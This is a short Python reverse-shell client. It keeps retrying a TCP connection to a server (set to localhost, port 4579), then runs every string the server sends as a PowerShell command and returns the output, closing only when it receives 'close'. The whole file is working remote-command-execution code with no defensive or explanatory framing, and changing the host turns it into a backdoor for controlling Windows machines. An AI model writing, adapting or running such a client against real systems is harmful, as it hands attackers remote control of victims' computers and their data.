import socket, sys, os
from datetime import datetime
import subprocess

hote = "localhost"
port = 4579
end = True
connect = False
now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print(now, " : Waiting server...")
while connect == False:
  try:
    socket.connect((hote, port))
    connect = True
  except:
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    print(now, " : Waiting server...")
    continue

now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
print(now, " : Connect to the server !")

socket.send("New connection".encode())
while end != False:
  response = socket.recv(255).decode()
  if response == "close":
    end = False
    socket.close()
    sys.exit(0)
  now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
  print(now, " : " ,response)

  try:
    result = subprocess.check_output(['powershell.exe', response]).decode()
    socket.send(result.encode())
  except:
    socket.send("error decode...".encode())
    continue
